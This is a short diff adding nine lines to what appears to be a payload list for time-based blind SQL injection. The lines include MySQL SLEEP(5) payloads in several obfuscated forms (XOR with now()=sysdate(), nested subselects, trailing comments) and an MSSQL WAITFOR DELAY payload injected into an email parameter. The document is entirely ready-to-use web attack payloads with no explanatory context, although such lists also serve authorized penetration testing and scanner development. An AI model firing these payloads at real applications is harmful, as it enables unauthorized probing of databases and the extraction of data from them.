@@ -1,0 +1,9 @@
+=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='
+=1'XOR(if(now()=sysdate(),sleep(5),0))OR'
+=1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337   
+=1 or sleep(5)#
+=0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+=(select(0)from(select(sleep(5)))v)
+
+email=test@gmail.com' WAITFOR DELAY '0:0:5'--
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
